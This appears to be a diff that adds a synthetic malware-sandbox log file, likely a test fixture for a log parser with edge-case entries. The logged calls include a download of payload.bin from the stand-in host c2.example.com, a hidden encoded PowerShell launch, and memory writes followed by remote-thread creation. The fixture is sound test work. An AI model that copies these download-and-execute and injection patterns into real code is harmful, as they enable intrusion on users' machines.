@@ -1,0 +1,37 @@
+# Log Creation Date: 03.01.2025 08:00:00
+# Analyzer Version: 2024.4.1
+# Flog Txt Version 1
+
+Process:
+id = "1"
+os_pid = "0x2000"
+os_parent_pid = "0x4"
+parent_id = "0"
+image_name = "edgecase.exe"
+filename = "c:\\users\\test\\edgecase.exe"
+cmd_line = "edgecase.exe"
+monitor_reason = "analysis_target"
+
+Region:
+id = "5"
+name = "private_0x0000000000010000"
+
+Thread:
+id = "1"
+os_tid = "0x2100"
+ [0001.000] GetCurrentProcess () returned 0xffffffffffffffff
+ [0001.001] CreateFileW (lpFileName="C:\\path with spaces\\file name.txt", dwDesiredAccess=0x40000000) returned 0x8
+ [0001.002] RegOpenKeyExW (hKey=0x80000002, lpSubKey="Software\\Microsoft\\Windows NT\\CurrentVersion", ulOptions=0x0, samDesired=0x20019) returned 0x0
+ [0001.003] CreateFileW (lpFileName="\\\\server\\share\\document.docx", dwDesiredAccess=0x80000000) returned 0x9
+ [0001.004] CreateFileW (lpFileName="", dwDesiredAccess=0x80000000) returned 0xffffffffffffffff
+ [0001.005] OutputDebugStringA (lpOutputString="debug: value=0x1234 status=ok") returned 0x0
+ [0001.006] MessageBoxW (hWnd=0x0, lpText="An error occurred.\nPlease try again.", lpCaption="Error", uType=0x10) returned 0x1
+ [0001.007] SetEnvironmentVariableW (lpName="PATH", lpValue="C:\\Windows\\system32;C:\\Windows") returned 0x1
+ [0001.008] URLDownloadToFileW (pCaller=0x0, szURL="https://c2.example.com/payload.bin", szFileName="C:\\Users\\test\\AppData\\Local\\Temp\\payload.bin", dwReserved=0x0) returned 0x0
+ [0001.009] CryptHashData (hHash=0x100, pbData=0x1234, dwDataLen=4096, dwFlags=0x0) returned 0x1
+ [0001.010] connect (s=0x4, name=0x7ffe2000, namelen=0x10) returned 0x0
+ [0001.011] send (s=0x4, buf=0x7ffe5000, len=256, flags=0x0) returned 256
+ [0001.012] recv (s=0x4, buf=0x7ffe5000, len=4096, flags=0x0) returned 128
+ [0001.013] CreateProcessW (lpApplicationName=NULL, lpCommandLine="powershell.exe -nop -w hidden -enc BASE64PAYLOAD", dwCreationFlags=0x8000000) returned 0x1
+ [0001.014] WriteProcessMemory (hProcess=0xffffffffffffffff, lpBaseAddress=0x140001000, lpBuffer=0x1000, nSize=4096) returned 0x1
+ [0001.015] CreateRemoteThread (hProcess=0xffffffffffffffff, lpThreadAttributes=0x0, dwStackSize=0x0, lpStartAddress=0x140001000, lpParameter=0x0, dwCreationFlags=0x0) returned 0x200
